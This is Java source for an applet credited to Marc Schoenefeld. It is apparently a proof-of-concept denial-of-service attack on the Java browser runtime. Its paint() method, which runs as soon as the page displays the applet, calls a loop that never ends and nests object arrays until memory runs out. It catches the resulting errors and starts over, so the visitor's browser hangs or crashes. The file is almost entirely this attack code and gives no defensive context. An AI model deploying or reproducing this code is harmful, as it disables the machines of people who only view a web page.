
/** Marc Schoenefeld **/
/* illegalaccess.org  */


public class MemApplet extends java.applet.Applet{

	static Object o = null;

  public static void main(String[] args) {
    (new MemApplet()).doit();
  }
  
  public void paint(java.awt.Graphics p) {
  	(new MemApplet()).doit();
  }
  
  void doit () {

    while (true) try {
        Object[] oarr = {o};  o = oarr;
    } catch (Throwable t) {
      o = null;
      System.out.println("Wurfgeschoss: " + t);
    }
  }
}

